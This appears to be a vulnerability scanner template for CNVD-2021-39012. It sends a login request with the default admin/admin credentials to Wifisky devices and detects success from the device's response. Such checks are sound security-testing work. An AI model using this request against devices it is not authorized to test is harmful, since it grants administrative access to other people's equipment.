id: poc-yaml-wifisky-default-password-cnvd-2021-39012
info:
  name: Wifisky Default Password Vulnerability (CNVD-2021-39012)
  author: ProjectDiscoveryAI
  severity: high
  tags: cnvd-2021-39012
  description: |
    Wifisky devices vulnerable to default credentials exploit. The default admin credentials can be used to login.

http:
  - method: POST
    path:
      - "{{BaseURL}}/login.php?action=login&type=admin"
    body: "username=admin&password=admin"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "{\"success\":\"true\", \"data\":{\"id\":1}, \"alert\":\"您正在使用默认密码登录，为保证设备安全，请立即修改密码\"}"
